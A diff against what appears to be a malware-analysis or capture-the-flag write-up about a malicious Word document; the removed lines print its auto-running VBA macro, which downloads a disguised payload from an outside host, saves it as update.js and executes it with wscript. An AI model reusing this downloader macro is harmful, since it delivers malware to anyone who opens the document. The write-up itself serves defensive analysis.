@@ -191,25 +191,6 @@ MD5 is broken for security use, but it is still what gets pasted into VirusTotal
 olevba Resume_WesleyTaylor.doc
 ```
 
-The macro is short and everything I needed for the next two questions was in it:
-
-```
-spath = "C:\ProgramData\"
-Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
-Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
-xHttp.Open "GET", "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png", False
-xHttp.Send
-With bStrm
-    .Type = 1
-    .Open
-    .write xHttp.responseBody
-    .savetofile spath & "\update.js", 2
-End With
-
-Set shell_object = CreateObject("WScript.Shell")
-shell_object.Exec ("wscript.exe C:\ProgramData\update.js")
-```
-
 Reading it in order:
 
 - `AutoOpen` in the summary table means the whole thing fires the moment the document opens. Maxine did not have to click anything else.
